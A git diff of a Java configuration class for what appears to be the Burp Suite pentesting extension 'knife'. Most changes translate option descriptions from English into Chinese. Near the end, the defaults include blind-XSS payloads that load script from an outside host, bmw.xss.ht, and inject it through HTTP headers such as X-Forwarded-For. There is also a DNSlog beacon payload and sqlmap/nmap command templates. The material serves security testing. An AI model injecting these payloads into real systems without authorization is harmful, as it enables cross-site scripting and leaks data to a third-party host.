@@ -34,60 +34,60 @@ public class ConfigTableModel extends AbstractTableModel{
 			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
 	
 	public ConfigTableModel(){
-		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false,"Merge all right-click from menu"));
+		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false,"合并所有右键菜单"));
 
 		//用于指示是否自动加载burp suite的项目配置文件,需要指示Json文件路径,需要支持相对路径,直接在knife下去寻找
-		configEntries.add(new ConfigEntry("Auto_Load_Project_Config_On_Startup", "Project.Config.json",ConfigEntry.Config_Basic_Variable,true,false,"Auto Load Burp Project Json Format Config File On Startup"));
-		configEntries.add(new ConfigEntry("Scope_Set_Base_On_Wildcard_SubDomain", "",ConfigEntry.Config_Basic_Variable,true,false,"Scope Operation Based ON Wildcard Subdomain"));
-		configEntries.add(new ConfigEntry("Auto_Save_Config_After_Update_Scope", "",ConfigEntry.Config_Basic_Variable,true,false,"Auto Saves Config After User Update Scope Advance"));
+		configEntries.add(new ConfigEntry("Auto_Load_Project_Config_On_Startup", "Project.Config.json",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：启动时自动加载项目配置"));
+		configEntries.add(new ConfigEntry("Scope_Set_Base_On_Wildcard_SubDomain", "",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：设置Scope时基于子域名操作"));
+		configEntries.add(new ConfigEntry("Auto_Save_Config_After_Update_Scope", "",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：自动保存Scope更新到项目配置"));
 
 		//默认不添加到scope的域名 //需要优化,不能每次都添加
 		String defaultExcludeHosts = ".*\\.baidu\\.com,.*\\.bdstatic\\.com,.*\\.msn\\.cn,.*\\.microsoft\\.com,.*\\.bing\\.com,.*\\.google\\.com,.*\\.firefox\\.com";
-		configEntries.add(new ConfigEntry("Auto_Append_Hosts_To_Exclude_Scope",defaultExcludeHosts,ConfigEntry.Config_Basic_Variable,false,false,"Auto Append This Hosts to Exclusion Scope On Startup"));
+		configEntries.add(new ConfigEntry("Auto_Append_Hosts_To_Exclude_Scope",defaultExcludeHosts,ConfigEntry.Config_Basic_Variable,false,false,"高级配置：启动时将主机追加到排除Scope"));
 
 		//流量过滤配置 //需要优化, 默认应该开启+函数处理逻辑应该优化
-		configEntries.add(new ConfigEntry("DismissedTargets", "{}",ConfigEntry.Config_Basic_Variable,true,false,"like {\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}"));
+		configEntries.add(new ConfigEntry("DismissedTargets", "{}",ConfigEntry.Config_Basic_Variable,true,false,"请求操作：{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}"));
 
 		//用于指示当前burp显示编码的环境变量,一般是GBK,UTF-8,关闭时使用burp启动时指定的编码.
-		configEntries.add(new ConfigEntry("Display_Coding", "UTF-8",ConfigEntry.Config_Basic_Variable,false,false,"One Code In: GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
-		configEntries.add(new ConfigEntry("Coding_Set_From", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"More Code In: GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
-		configEntries.add(new ConfigEntry("Coding_Set_Using", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"More Code In: GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
+		configEntries.add(new ConfigEntry("Display_Coding", "UTF-8",ConfigEntry.Config_Basic_Variable,false,false,"响应编码：显示编码 GBK|GB2312|UTF-8等"));
+		configEntries.add(new ConfigEntry("Coding_Set_From", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"响应编码：编码来源 GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
+		configEntries.add(new ConfigEntry("Coding_Set_Using", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"响应编码：编码目标 GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
 
 		//自动化处理一些常用的属性
-		configEntries.add(new ConfigEntry("OptionsAddHeader", "Content-Type: application/octet-stream",ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
-		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true));
-		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
+		configEntries.add(new ConfigEntry("OptionsAddHeader", "Content-Type: application/octet-stream",ConfigEntry.Config_Basic_Variable,true,false,"修改响应：OPTIONS方法添加响应头"));
+		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除Last-Modified头"));
+		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除If-Modified-Since头"));
+		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除If-None-Match头"));
 
 		//运行外部程序的配置
 		if (Utils.isMac()) {
-			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
+			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：指定浏览器路径"));
 		}else {
-			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false));
+			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：指定浏览器路径"));
 		}
 		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"this config effect sqlmap and nmap"));
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"命令输入：机器输入 影响sqlmap和nmap"));
 		}else {
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"this config effect sqlmap and nmap"));
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"命令输入：机器输入 影响sqlmap和nmap"));
 		}
-		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：SQL调用命令"));
+		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：Nmap调用命令"));
 
 		//Chunked set
-		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
-		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
-		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
+		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false,"分块配置：功能开关"));
+		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false,"分块配置：分块长度"));
+		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false,"分块配置：使用批注"));
 
 		//代理扫描配置 未测试过
-		configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
-		configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
+		configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false,"代理访问：上游代理列表"));
+		configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false,"代理访问：随机使用上游代理"));
 
 		//cookie功能的配置
-		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false,"基本属性：常见认证头"));
+		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,false,false,"基本属性：DNSLog域名"));
 
 		//payload 设置
 		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,false));
-		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,false));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
